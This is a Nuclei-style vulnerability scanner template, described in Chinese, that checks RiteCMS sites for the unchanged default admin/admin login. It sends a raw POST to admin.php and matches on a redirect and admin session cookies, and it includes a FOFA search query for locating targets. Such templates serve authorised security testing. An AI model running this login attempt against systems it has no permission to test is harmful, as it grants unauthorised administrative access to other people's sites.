id: ritecms-default-login

info:
  name: RiteCMS 默认口令登录（弱口令）
  author: 0x_Akoko
  severity: high
  description: |
    该模板通过尝试 RiteCMS 的默认凭据，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统并访问相应管理功能或业务数据。
  reference:
    - https://ritecms.com/
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="ritecms"
  tags: ritecms,default-login,vuln

variables:
  username: "admin"
  password: "admin"

http:
  - raw:
      - |
        POST {{path}}admin.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&userpw={{password}}

    payloads:
      path:
        - "/"
        - "/ritecms/"

    matchers:
      - type: dsl
        dsl:
          - "status_code == 302"
          - "contains_all(set_cookie, 'PHPSESSID','admin=true')"
        condition: and
